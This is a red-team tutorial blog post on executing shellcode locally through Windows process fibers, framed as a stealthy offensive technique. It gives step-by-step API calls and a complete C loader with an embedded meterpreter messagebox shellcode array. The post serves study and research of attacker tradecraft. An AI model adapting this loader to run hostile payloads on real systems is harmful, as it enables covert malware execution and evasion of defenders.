---
layout: post
title: "7 days of Red- Day 1"
date: 2021-3-31 0:00:00 -0400
categories: Writeup
---


​                                                                                           

```


/***
 *    ███████╗    ██████╗  █████╗ ██╗   ██╗███████╗     ██████╗ ███████╗    ██████╗ ███████╗██████╗ 
 *    ╚════██║    ██╔══██╗██╔══██╗╚██╗ ██╔╝██╔════╝    ██╔═══██╗██╔════╝    ██╔══██╗██╔════╝██╔══██╗
 *        ██╔╝    ██║  ██║███████║ ╚████╔╝ ███████╗    ██║   ██║█████╗      ██████╔╝█████╗  ██║  ██║
 *       ██╔╝     ██║  ██║██╔══██║  ╚██╔╝  ╚════██║    ██║   ██║██╔══╝      ██╔══██╗██╔══╝  ██║  ██║
 *       ██║      ██████╔╝██║  ██║   ██║   ███████║    ╚██████╔╝██║         ██║  ██║███████╗██████╔╝
 *       ╚═╝      ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝     ╚═════╝ ╚═╝         ╚═╝  ╚═╝╚══════╝╚═════╝ 
 *                                                                                                  
 */
          
      ██████╗  █████╗ ██╗   ██╗     ██╗
      ██╔══██╗██╔══██╗╚██╗ ██╔╝    ███║
      ██║  ██║███████║ ╚████╔╝     ╚██║
      ██║  ██║██╔══██║  ╚██╔╝       ██║
      ██████╔╝██║  ██║   ██║        ██║
      ╚═════╝ ╚═╝  ╚═╝   ╚═╝        ╚═╝
                                       
      
      
      
          
                                           


```

## **Process Fiber Local Shellcode Execution**
Local shellcode execution techniques can be used by attackers to spawn malicious code from inside a process.
Recently the Lazuras group employed this class of technique in order run code in VBA Macros undetected, more information can be found here: https://research.nccgroup.com/2021/01/23/rift-analysing-a-lazarus-shellcode-execution-method/.
However in this technique we are abusing the implementation of process fibers in order to run local shellcode. 
These fibers are essentially lightweight threads that can be scheduled in user mode without the need of assistance from the kernel. Due to this, execution of a process fiber is invisible to the kernel,which makes it a interesting method for offensive purposes. In order to implement a process fiber you would have to convert your current thread into a fiber. 
Then from there you will be able to schedule sub-fibers that point to your shellcode.
Lastly you just need to switch to the shellcode fiber context in order to execute it.


This will cause a alert due to this being a meterpreter payload for spawning a messagebox*

Steps:

- [ ]  1`Convert Current Thread to a Fiber-ConvertThreadToFiber()`

- [ ]  2.`Allocate Memory in the Current Process with PAGE_EXECUTE_READWRITE permissions-VirtualAlloc()`

  ​      *** **`Allocating memory with PAGE_EXECUTE_READWRITE is bad opsec****`

- [ ] 3. `Copy shellcode into allocated memory space - CopyMemory()`

- [ ] 4.`Start a New fiber pointing to the allocated memory space - CreateFiber()`

- [ ] 5.`Switch Fiber Context to newly created Fiber-SwitchFiber()`

C Code for implementation:



```c
#include <windows.h>


int main(int argc, char **argv){

unsigned char shellcode[] =
"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41\x51"
"\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x3e\x48"
"\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72\x50\x3e\x48"
"\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02"
"\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x3e"
"\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48\x01\xd0\x3e\x8b\x80\x88"
"\x00\x00\x00\x48\x85\xc0\x74\x6f\x48\x01\xd0\x50\x3e\x8b\x48"
"\x18\x3e\x44\x8b\x40\x20\x49\x01\xd0\xe3\x5c\x48\xff\xc9\x3e"
"\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41"
"\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24"
"\x08\x45\x39\xd1\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0"
"\x66\x3e\x41\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e"
"\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41"
"\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7\xc1"
"\x00\x00\x00\x00\x3e\x48\x8d\x95\xfe\x00\x00\x00\x3e\x4c\x8d"
"\x85\x08\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83\x56\x07\xff"
"\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2\x56\xff\xd5\x53\x68\x65"
"\x6c\x6c\x63\x6f\x64\x65\x00\x53\x75\x63\x63\x65\x73\x73\x00";

LPVOID fiber = ConvertThreadToFiber(NULL);
LPVOID shellLoc= VirtualAlloc(NULL,sizeof(shellcode),MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);
CopyMemory(shellLoc,shellcode,sizeof(shellcode));
LPVOID shellFiber= CreateFiber(0,(LPFIBER_START_ROUTINE)shellLoc,NULL);
SwitchToFiber(shellFiber);

}

```
Ref:

https://docs.microsoft.com/en-us/windows/win32/procthread/fibers






 
